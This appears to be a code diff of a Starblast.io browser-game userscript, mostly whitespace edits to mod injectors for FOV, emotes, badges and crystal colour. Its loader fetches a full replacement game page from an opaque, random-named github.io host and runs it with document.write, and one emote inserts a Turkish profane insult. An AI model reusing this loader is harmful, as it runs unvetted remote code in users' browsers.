@@ -13,12 +13,12 @@ const logLowercase = (msg) => console.log(`%c[${modName}] ${msg}`, "color: #FF00
 function lowercaseInjector(sbCode) {
   let src = sbCode;
   let prevSrc = src;
-  
+
   function checkSrcChange() {
     if (src === prevSrc) throw new Error("replace did not work");
     prevSrc = src;
   }
-  
+
   src = src.replace(/\.toUpperCase\(\)/g, "");
   const styleBlock = `
   <style>
@@ -27,7 +27,7 @@ function lowercaseInjector(sbCode) {
   `;
   src = src.replace('</head>', `${styleBlock}</head>`);
   checkSrcChange();
-  
+
   logLowercase("Mod injected");
   return src;
 }
@@ -39,22 +39,22 @@ const logEmote = (msg) => console.log(`%c[${emoteModName}] ${msg}`, "color: #FFA
 function emoteInjector(sbCode) {
   let src = sbCode;
   let prevSrc = src;
-  
+
   function checkSrcChange() {
     if (src === prevSrc) throw new Error("replace did not work");
     prevSrc = src;
   }
-  
+
   const vocabPattern = /(this\.vocabulary\s*=\s*\[[\s\S]*?\})/;
   const clownEmote = `,{
     text: "orosbu cocu",
     icon: "🤡",
     key: "J"
   }`;
-  
+
   src = src.replace(vocabPattern, `$1${clownEmote}`);
   checkSrcChange();
-  
+
   logEmote("Clown emote injected");
   return src;
 }
@@ -70,16 +70,16 @@ window.I1000.currentFOV = 45;
 function fovInjector(sbCode) {
   let src = sbCode;
   let prevSrc = src;
-  
+
   function checkSrcChange() {
     if (src === prevSrc) throw new Error("replace did not work");
     prevSrc = src;
   }
-  
+
   const fovPattern = /this\.I1000\.fov\s*=\s*45\s*\*\s*this\.IO11l\.I1000\.zoom/g;
   src = src.replace(fovPattern, 'this.I1000.fov = (window.modSettings.fovEnabled ? window.I1000.currentFOV : 45) * this.IO11l.I1000.zoom');
   checkSrcChange();
-  
+
   const controlStyles = `
   <style>
   #mod-controls {
@@ -90,7 +90,7 @@ function fovInjector(sbCode) {
     font-family: Arial, sans-serif;
     user-select: none;
   }
-  
+
   #mod-controls-header {
     background: rgba(0, 0, 0, 0.8);
     color: white;
@@ -100,7 +100,7 @@ function fovInjector(sbCode) {
     width: 80px;
     text-align: center;
   }
-  
+
   #mod-controls-panel {
     background: rgba(0, 0, 0, 0.8);
     color: white;
@@ -110,24 +110,24 @@ function fovInjector(sbCode) {
     width: 200px;
     display: none;
   }
-  
+
   .mod-control {
     display: flex;
     justify-content: space-between;
     align-items: center;
     margin: 10px 0;
   }
-  
+
   .mod-control-slider {
     width: 100%;
     margin-top: 5px;
   }
-  
+
   #crystal-color-picker {
     width: 100%;
     margin-top: 5px;
   }
-  
+
   #fov-display {
     background: rgba(0, 0, 0, 0.7);
     padding: 5px 10px;
@@ -136,20 +136,20 @@ function fovInjector(sbCode) {
     margin-top: 5px;
     display: none;
   }
-  
+
   .toggle-switch {
     position: relative;
     display: inline-block;
     width: 30px;
     height: 17px;
   }
-  
+
   .toggle-switch input {
     opacity: 0;
     width: 0;
     height: 0;
   }
-  
+
   .slider {
     position: absolute;
     cursor: pointer;
@@ -161,7 +161,7 @@ function fovInjector(sbCode) {
     transition: .4s;
     border-radius: 17px;
   }
-  
+
   .slider:before {
     position: absolute;
     content: "";
@@ -173,15 +173,15 @@ function fovInjector(sbCode) {
     transition: .4s;
     border-radius: 50%;
   }
-  
+
   input:checked + .slider {
     background-color: #2196F3;
   }
-  
+
   input:checked + .slider:before {
     transform: translateX(13px);
   }
-  
+
   .control-value {
     font-size: 12px;
     text-align: right;
@@ -189,7 +189,7 @@ function fovInjector(sbCode) {
   }
   </style>
   `;
-  
+
   const controlsHTML = `
   <div id="mod-controls">
     <div id="mod-controls-header">Controls</div>
@@ -223,7 +223,7 @@ function fovInjector(sbCode) {
     </div>
   </div>
   `;
-  
+
   // Add emote capacity mod
   const emoteCapacityMod = `
   let globalVal = ChatPanel.toString().match(/[0OlI1]{5}/)[0];
@@ -234,7 +234,7 @@ function fovInjector(sbCode) {
   };
   ChatPanel.prototype.typed = Function("return " + ChatPanel.prototype.typed.toString().replace(/>=\\s*4/, " >= this.getEmotesCapacity()"))();
   `;
-  
+
   // Add blank ECP mod
   const blankECPMod = `
   /*
@@ -246,20 +246,21 @@ function fovInjector(sbCode) {
 
   Search: for (let i in window) {
     try {
-      let val = window[i].prototype;
+      let val = window[i]?.prototype;
+      if (!val) continue;
       for (let j in val) {
         let func = val[j];
-        
+
         // Check if the function string matches the pattern
         if (typeof func === "function" && func.toString().match(pattern)) {
-          
+
           // Replace the function with the modified version
           val[j] = Function("return " + func.toString().replace(pattern, ", window.module.exports.settings.check('show_blank_badge') || $1"))();
           found = true;
-          
+
           // Modify the drawIcon function to respect the "blank" badge setting
           val.drawIcon = Function("return " + val.drawIcon.toString().replace(/}\\s*else\\s*{/, '} else if (this.icon !== "blank") {'))();
-          
+
           // Find and modify the function that deals with the leaderboard table
           let gl = window[i];
           for (let k in gl) {
@@ -283,7 +284,7 @@ function fovInjector(sbCode) {
     }
   }
   `;
-  
+
   // Add crystal color mod
   const crystalColorMod = `
   let CrystalObject;
@@ -305,7 +306,7 @@ function fovInjector(sbCode) {
     return res
   };
   `;
-  
+
   src = src.replace('</body>', `
     ${controlStyles}
     ${controlsHTML}
@@ -313,7 +314,7 @@ function fovInjector(sbCode) {
     ${emoteCapacityMod}
     ${blankECPMod}
     ${crystalColorMod}
-    
+
     const fovDisplay = document.getElementById('fov-display');
 
     // Add wheel event listener for FOV change
@@ -334,52 +335,52 @@ function fovInjector(sbCode) {
       const emoteValue = document.getElementById('emote-capacity-value');
       const blankECPToggle = document.getElementById('blank-ecp-toggle');
       const crystalColorPicker = document.getElementById('crystal-color-picker');
-      
+
       // Initialize values from localStorage
       const savedCrystalColor = localStorage.getItem('crystal-color');
       if (savedCrystalColor) {
         crystalColorPicker.value = savedCrystalColor;
       }
-      
+
       controlsHeader.addEventListener('click', () => {
         controlsPanel.style.display = controlsPanel.style.display === 'none' ? 'block' : 'none';
       });
-      
+
       fovToggle.addEventListener('change', () => {
         window.modSettings.fovEnabled = fovToggle.checked;
         fovDisplay.style.display = fovToggle.checked ? 'block' : 'none';
       });
-      
+
       emoteSlider.addEventListener('input', () => {
         const value = emoteSlider.value;
         emoteValue.textContent = value;
         if (window.ChatPanel) {
-          window.ChatPanel.prototype.getEmotesCapacity = function() {
+          window.ChatPanel.prototype.getEmotesCapacity = function () {
             return parseInt(value);
           };
         }
       });
-      
+
       blankECPToggle.addEventListener('change', () => {
         if (window.module && window.module.exports) {
           window.module.exports.settings.set('show_blank_badge', blankECPToggle.checked);
         }
       });
-      
+
       // Set the "Show Blank ECPs" to true by default
       if (window.module && window.module.exports) {
         window.module.exports.settings.set('show_blank_badge', true);
       }
-      
+
       crystalColorPicker.addEventListener('change', () => {
         localStorage.setItem('crystal-color', crystalColorPicker.value);
       });
     });
     </script>
     </body>`);
-  
+
   checkSrcChange();
-  
+
   logFOV("FOV injector applied");
   return src;
 }
@@ -420,26 +421,26 @@ function injectLoader() {
     log("Injection not needed");
     return;
   }
-  
+
   document.open();
   document.write('<html><head><title></title></head><body style="background-color:#ffffff;"><div style="margin: auto; width: 50%;"><h1 style="text-align: center;padding: 170px 0;color: #000;"></h1><h1 style="text-align: center;color: #000;"></h1></div></body></html>');
   document.close();
-  
+
   var url = 'https://assdsasdqwqeqdzcxznfcn1029d8919208nx9.github.io/OLUMUksmdmksladmkakmsak10911oms1ks1mklmkls11921ms1sımn1sösm2k1.html';
   url += '?_=' + new Date().getTime();
-  
+
   var xhr = new XMLHttpRequest();
   log("Fetching custom source...");
   xhr.open("GET", url);
   xhr.onreadystatechange = function () {
     if (xhr.readyState === 4) {
       var starSRC = xhr.responseText;
-      
+
       if (starSRC !== undefined) {
         log("Source fetched successfully");
         const start_time = performance.now();
         log("Applying mods...");
-        
+
         if (!window.sbCodeInjectors) {
           log("No Starblast.io userscripts found to load");
         } else {
@@ -460,10 +461,10 @@ function injectLoader() {
             }
           }
         }
-        
+
         const end_time = performance.now();
         log(`Mods applied successfully (${(end_time - start_time).toFixed(0)}ms)`);
-        
+
         document.open();
         document.write(starSRC);
         document.close();
@@ -473,7 +474,7 @@ function injectLoader() {
       }
     }
   };
-  
+
   xhr.send();
 }
 
